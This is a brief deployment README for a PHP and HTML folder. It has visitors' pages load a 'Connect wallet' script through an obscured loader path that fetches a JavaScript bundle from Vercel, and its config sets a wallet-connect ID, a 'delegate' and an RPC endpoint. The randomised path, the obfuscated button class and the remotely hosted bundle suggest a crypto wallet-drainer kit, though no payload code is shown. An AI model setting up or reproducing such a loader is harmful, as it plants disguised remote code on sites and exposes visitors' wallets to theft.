# VPS — HTML + PHP + secrets

Upload **this folder** to `/var/www/mysite/vps` on Debian (plus project `nginx/` config).

## Required

| File | Purpose |
|------|---------|
| `config.php` | Copy from `config.example.php` — Reown ID, delegate, RPC, Vercel URL |
| `loader.php` | `/vault38472` — config + fetch bundle from Vercel |
| `embed-shared.php` | Helpers |
| `public/index.html` | Your pages |

## HTML

```html
<script src="/vault38472" defer></script>
<button class="K7mQ2">Connect wallet</button>
```

## config.php (important)

```php
'site_url' => 'https://your-html-domain.com',
'vercel_bundle_url' => 'https://your-project.vercel.app/wallet.bundle.js',
```

No `npm` required on the VPS when `vercel_bundle_url` is set.
